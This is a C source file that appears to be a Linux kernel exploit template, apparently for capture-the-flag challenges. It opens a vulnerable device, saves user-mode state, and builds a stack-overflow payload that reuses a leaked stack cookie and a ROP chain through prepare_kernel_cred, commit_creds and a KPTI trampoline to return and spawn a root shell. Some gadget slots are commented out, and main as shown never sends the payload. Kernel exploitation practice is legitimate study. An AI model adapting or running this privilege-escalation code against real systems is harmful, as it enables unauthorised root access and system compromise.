#include <fcntl.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#define debug(msg, ...)                                                        \
    {                                                                          \
        if (DEBUG_FLAG) {                                                      \
            fprintf(stderr, "[D] " msg "\n", ##__VA_ARGS__);                   \
        }                                                                      \
    }
#define info_prefix "[*] "
#define info(msg, ...) printf(info_prefix msg "\n", ##__VA_ARGS__);
#define progress(msg, ...) printf("[+] " msg "\r", ##__VA_ARGS__);
#define fatal(msg, ...)                                                        \
    {                                                                          \
        printf("[!] " msg "\n", ##__VA_ARGS__);                                \
        exit(EXIT_FAILURE);                                                    \
    }
#define pause()                                                                \
    {                                                                          \
        printf(info_prefix "Press ENTER to continue");                         \
        getchar();                                                             \
    }
#define var(var) printf(info_prefix #var " = 0x%016llx\n", var);
#define rebase(addr) (addr - RAW_KBASE + kbase)

#define DEVICE_NAME "CHANGEME"
#define RAW_KBASE 0xffffffff81000000

typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned char u8;

u8 DEBUG_FLAG = 0;
int g_fd;

u64 user_cs, user_rflags, user_sp, user_ss;
u64 cookie, kbase, offset;
u64 tmp_buf, cred_struct;

enum current_state {
    create_cred_struct_state,
    spawn_shell_state,
} global_cstate = create_cred_struct_state;

void _write(void *buf, size_t sz) {
    ssize_t nb = write(g_fd, buf, sz);
    if (nb < 0) {
        fatal("write failure");
    }
    debug("Wrote 0x%zx bytes", nb);
}

void _read(void *buf, size_t sz) {
    ssize_t nb = read(g_fd, buf, sz);
    if (nb < 0) {
        fatal("read failure");
    }
    debug("Read 0x%zx bytes", nb);
}

void _ioctl(u32 cmd, u64 arg) {
    ioctl(g_fd, cmd, arg);
}

void open_dev(void) {
    g_fd = open(DEVICE_NAME, O_RDWR);
    if (g_fd < 0) {
        fatal("Failed to open device: %s", DEVICE_NAME);
    }
    debug("Device opened");
}

void spawn_shell(void) {
    uid_t uid = geteuid();
    if (uid > 0) {
        fatal("Failed to get root uid, current uid = %d", uid);
    }
    info("Spawning shell as root uid");
    system("/bin/sh");
}

void safe_exit(void);

void privesc(void) {
    size_t payload[0x200 / 8];
    size_t cookie_idx = 0x80 / 8;

    payload[cookie_idx++] = cookie;
    payload[cookie_idx++] = 0; // rbx

    if (global_cstate == create_cred_struct_state) {
        /* payload[cookie_idx++] = pop_rdi; // saved rip */
        payload[cookie_idx++] = 0;
        /* payload[cookie_idx++] = prepare_kernel_cred; */
    } else if (global_cstate == spawn_shell_state) {
        /* payload[cookie_idx++] = pop_rdi; // saved_rip */
        payload[cookie_idx++] = cred_struct;
        /* payload[cookie_idx++] = commit_creds; */
    }
    /* payload[cookie_idx++] = kpti_trampoline + 22; */
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = 0;
    payload[cookie_idx++] = (size_t)safe_exit;
    payload[cookie_idx++] = user_cs;
    payload[cookie_idx++] = user_rflags;
    payload[cookie_idx++] = user_sp;
    payload[cookie_idx++] = user_ss;

    info("Sending payload");
    _write(payload, sizeof(payload));
}

void safe_exit(void) {
    __asm__(".intel_syntax noprefix;"
            "mov tmp_buf, rax;"
            ".att_syntax noprefix;");
    if (global_cstate == create_cred_struct_state) {
        cred_struct = tmp_buf;
        debug("cred_struct @ 0x%llx", cred_struct);
        global_cstate = spawn_shell_state;
        privesc();
        return;
    }
    spawn_shell();
}

void save_user_state(void) {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_sp, rsp;"
            "mov user_ss, ss;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
    debug("User state saved");
}

int main(int argc, char *argv[]) {
    for (size_t i = 0; i < argc; i++) {
        if (strcmp(argv[i], "DEBUG") == 0) {
            DEBUG_FLAG = 1;
            break;
        }
    }
    setbuf(stdin, 0);
    setbuf(stdout, 0);
    setbuf(stderr, 0);
    save_user_state();

    open_dev();
    getchar();

    close(g_fd);
    return 0;
}
